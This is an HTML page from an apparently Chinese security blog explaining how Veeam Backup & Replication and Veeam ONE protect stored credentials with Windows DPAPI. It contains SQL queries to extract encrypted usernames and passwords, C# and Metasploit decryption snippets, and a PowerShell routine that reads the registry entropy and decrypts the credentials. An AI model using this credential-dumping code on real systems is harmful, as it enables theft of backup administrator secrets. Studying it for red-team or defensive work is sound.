@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Veeam致谢: S3cur3Th1sSh1t Metasploit Checkymander 由上边两篇源码，一篇原理，我们了解Veeam 加密逻辑，通过DPAPI加密凭证。 什么是DPAPI Data Protection Application Programming Interface  is a simple cryptographic application programming i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Veemon小记">
+<meta property="og:url" content="https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:site_name" content="3inter&#39;s Blog">
+<meta property="og:description" content="Veeam致谢: S3cur3Th1sSh1t Metasploit Checkymander 由上边两篇源码，一篇原理，我们了解Veeam 加密逻辑，通过DPAPI加密凭证。 什么是DPAPI Data Protection Application Programming Interface  is a simple cryptographic application programming i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zero-winter.github.io/assets/image-20240630004545-kf29mob.png">
+<meta property="article:published_time" content="2024-10-21T13:02:15.000Z">
+<meta property="article:modified_time" content="2024-10-21T15:10:27.900Z">
+<meta property="article:author" content="zero-3inter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zero-winter.github.io/assets/image-20240630004545-kf29mob.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Veemon小记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">3inter&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2024/10/08/C-Sharp-ViewState-Deserialization/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&text=Veemon小记"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&is_video=false&description=Veemon小记"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Veemon小记&body=Check out this article: https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&name=Veemon小记&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Veeam"><span class="toc-number">1.</span> <span class="toc-text">Veeam</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDPAPI"><span class="toc-number">1.1.</span> <span class="toc-text">什么是DPAPI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%A6%E5%BD%92%E6%AD%A3%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">书归正传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8D%E5%8F%AF%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">环境不可用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%BD%E5%9C%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">落地代码</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Veemon小记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">3inter's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2024-10-21T13:02:15.000Z" itemprop="datePublished">2024-10-21</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Veeam"><a href="#Veeam" class="headerlink" title="Veeam"></a>Veeam</h1><p><strong>致谢:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/SharpVeeamDecryptor">S3cur3Th1sSh1t</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/SharpVeeamDecryptor">Metasploit</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/">Checkymander</a></p>
+<p>由上边两篇源码，一篇原理，我们了解Veeam 加密逻辑，通过DPAPI加密凭证。</p>
+<h2 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h2><blockquote>
+<p><strong>Data Protection Application Programming Interface</strong>  is a simple <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptography" title="Cryptography">cryptographic</a> <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Application_programming_interface" title="Application programming interface">application programming interface</a> available as a built-in component in <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_2000" title="Windows 2000">Windows 2000</a> and later versions of <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Microsoft_Windows" title="Microsoft Windows">Microsoft Windows</a> <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system" title="Operating system">operating systems</a></p>
+</blockquote>
+<h2 id="书归正传"><a href="#书归正传" class="headerlink" title="书归正传"></a>书归正传</h2><ul>
+<li><p>代码示例1：</p>
+<p>获取加密得凭证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_name, password <span class="hljs-keyword">FROM</span> VeeamBackup.dbo.Credentials<br></code></pre></td></tr></table></figure>
+
+<p>代码示例2：</p>
+<p>解密核心逻辑</p>
+<p>出处:<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/standard/security/how-to-use-data-protection">learn.microsoft.com&#x2F;zh-cn&#x2F;dotnet&#x2F;standard&#x2F;security&#x2F;how-to-use-da…</a></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">DecryptPassword</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> encryptedPassword</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-built_in">byte</span>[] encryptedbytePassword = Convert.FromBase64String(encryptedPassword);<br>            <span class="hljs-built_in">byte</span>[] decryptedData = ProtectedData.Unprotect(encryptedbytePassword, <span class="hljs-literal">null</span>, DataProtectionScope.LocalMachine);<br>            <span class="hljs-keyword">return</span> Encoding.Default.GetString(decryptedData);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            Console.WriteLine(<span class="hljs-string">$&quot;Error decrypting password: <span class="hljs-subst">&#123;ex.Message&#125;</span>&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="环境不可用"><a href="#环境不可用" class="headerlink" title="环境不可用"></a>环境不可用</h2><ul>
+<li><p>从msf 官方发现了一个post 后渗透插件</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/veeam_credential_dump.rb">github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;blob&#x2F;master&#x2F;&#x2F;modules&#x2F;post…</a></p>
+<p>通过阅读代码Veeam版本分为 ：</p>
+<ol>
+<li>Veeam Backup &amp; Replication</li>
+<li>Veeam ONE Monitor</li>
+</ol>
+</li>
+</ul>
+<p>代码示例1：</p>
+<p>获取加密凭证</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">SELECT user_name,password FROM monitor.Credentials<br></code></pre></td></tr></table></figure>
+
+<p>代码示例2：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># Veeam ONE switched from weaksauce PBKDF2 to DPAPI with static entropy between 11.0.0 and 11.0.1</span><br><span class="hljs-meta"># DPAPI is in use <span class="hljs-keyword">if</span> there is an an &quot;Entropy&quot; value under HKLM:\SOFTWARE\Veeam\Veeam ONE\Private\</span><br><span class="hljs-keyword">if</span> !@vom_entropy_b64.nil? &amp;&amp; !@vom_entropy_b64.empty? <span class="hljs-meta"># New-style (DPAPI)</span><br>  cmd_str = <span class="hljs-string">&quot;Add-Type -AssemblyName System.Security;[Text.Encoding]::Unicode.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String(&#x27;#&#123;b64&#125;&#x27;),[Convert]::FromBase64String(&#x27;#&#123;@vom_entropy_b64&#125;&#x27;), &#x27;LocalMachine&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>从代码中，我们可以看到，和之前代码逻辑想比，Veeam One Monitor 版本加密，将注册表中 <code>HKLM:\SOFTWARE\Veeam\Veeam ONE\Private\</code>​的二进制值，传入该解密方法中。</p>
+<p>那么我们跟进一下代码</p>
+<p>​<img src="/assets/image-20240630004545-kf29mob.png" alt="image">​</p>
+<p>两段代码同时都调用了微软官方的这个接口</p>
+<p>我们来看核心函数:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span>Decrypts the data in a specified byte array and returns a byte array that contains the decrypted data.<span class="hljs-doctag">&lt;/summary&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;encryptedData&quot;&gt;</span>A byte array containing data encrypted using the <span class="hljs-doctag">&lt;see cref=&quot;M:System.Security.Cryptography.ProtectedData.Protect(System.Byte[],System.Byte[],System.Security.Cryptography.DataProtectionScope)&quot; /&gt;</span> method.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;optionalEntropy&quot;&gt;</span>An optional additional byte array that was used to encrypt the data, or <span class="hljs-doctag">&lt;see langword=&quot;null&quot; /&gt;</span> if the additional byte array was not used.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name=&quot;scope&quot;&gt;</span>One of the enumeration values that specifies the scope of data protection that was used to encrypt the data.<span class="hljs-doctag">&lt;/param&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.ArgumentNullException&quot;&gt;</span>The <span class="hljs-doctag">&lt;paramref name=&quot;encryptedData&quot; /&gt;</span> parameter is <span class="hljs-doctag">&lt;see langword=&quot;null&quot; /&gt;</span>.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.Security.Cryptography.CryptographicException&quot;&gt;</span>The decryption failed.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.NotSupportedException&quot;&gt;</span>The operating system does not support this method.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.OutOfMemoryException&quot;&gt;</span>Out of memory.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;exception cref=&quot;T:System.PlatformNotSupportedException&quot;&gt;</span>.NET Core and .NET 5+ only: Calls to the <span class="hljs-doctag">&lt;c&gt;</span>Unprotect<span class="hljs-doctag">&lt;/c&gt;</span> method are supported on Windows operating systems only.<span class="hljs-doctag">&lt;/exception&gt;</span></span><br><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>A byte array representing the decrypted data.<span class="hljs-doctag">&lt;/returns&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">Unprotect</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">byte</span>[] encryptedData,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">byte</span>[]? optionalEntropy,</span></span><br><span class="hljs-params"><span class="hljs-function">  DataProtectionScope scope</span>)</span><br>&#123;<br>  ProtectedData.CheckPlatformSupport();<br>  <span class="hljs-keyword">if</span> (encryptedData == <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span> (encryptedData));<br>  <span class="hljs-keyword">return</span> ProtectedData.ProtectOrUnprotect(encryptedData, optionalEntropy, scope, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>函数作用:Decrypts the data in a specified byte array and returns a byte array that contains the decrypted data.</p>
+<p>第一个参数，byte[] 的加密数据</p>
+<p>第二个参数: 解密指定字节数组中的数据，并返回包含解密数据的字节数组。</p>
+<p>第三个参数: 指定用于加密数据的数据保护范围的枚举值之一。</p>
+<p>返回是解密的数据byte[] 数组</p>
+</li>
+</ul>
+<p>‍</p>
+<h2 id="落地代码"><a href="#落地代码" class="headerlink" title="落地代码"></a>落地代码</h2><ul>
+<li><p>本地解密</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;crypted data&gt;&quot;</span><br><span class="hljs-variable">$key</span> = [<span class="hljs-type">Convert</span>]::ToBase64String((<span class="hljs-built_in">Get-ItemPropertyValue</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\&#x27;</span> <span class="hljs-literal">-Name</span> Entropy))<br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.Security;[<span class="hljs-type">Text.Encoding</span>]::Unicode.GetString([<span class="hljs-type">Security.Cryptography.ProtectedData</span>]::Unprotect([<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$data</span>),[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$key</span>), <span class="hljs-string">&#x27;LocalMachine&#x27;</span>))<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Veeam"><span class="toc-number">1.</span> <span class="toc-text">Veeam</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDPAPI"><span class="toc-number">1.1.</span> <span class="toc-text">什么是DPAPI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%A6%E5%BD%92%E6%AD%A3%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">书归正传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8D%E5%8F%AF%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">环境不可用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%BD%E5%9C%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">落地代码</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&text=Veemon小记"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&is_video=false&description=Veemon小记"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Veemon小记&body=Check out this article: https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&title=Veemon小记"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zero-winter.github.io/2024/10/21/Veeam%E5%B0%8F%E8%AE%B0/&name=Veemon小记&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2024 zero-3inter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Zero-winter">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
